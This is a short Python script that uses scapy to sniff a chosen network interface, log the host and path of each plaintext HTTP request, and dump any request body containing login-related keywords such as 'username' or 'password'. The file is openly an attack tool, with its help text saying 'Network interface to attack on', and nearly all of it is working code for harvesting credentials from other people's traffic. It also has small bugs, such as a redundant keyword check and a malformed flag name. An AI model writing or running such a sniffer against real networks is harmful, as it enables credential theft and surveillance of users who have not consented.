from sqlite3 import InterfaceError
import scapy.all as scapy
from scapy.layers import http
import argparse
import sys


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn = process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[*] Visited --> {}".format(url))
        print("-"*len(url))
        load = get_info(packet)
        if load: 
            print("\n\n[*]User İnformation --> {}".format(load))

def get_url(packet):
    return(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')

def get_info(packet):
    if packet.haslayer(scapy.Raw):
        field_load= packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in keywords:
                if keyword in field_load:
                    return field_load

if __name__=='__main__':

    parser = argparse.ArgumentParser(description='Packet Sniffing Tool')
    parser.add_argument('-i' '--interface', help='Network interface to attack on', dest='interface',default=False)
    args = parser.parse_args()
    if not args.interface:
        parser.error('No Network interface given')
        sys.exit(1)
    sniffer(args.interface)



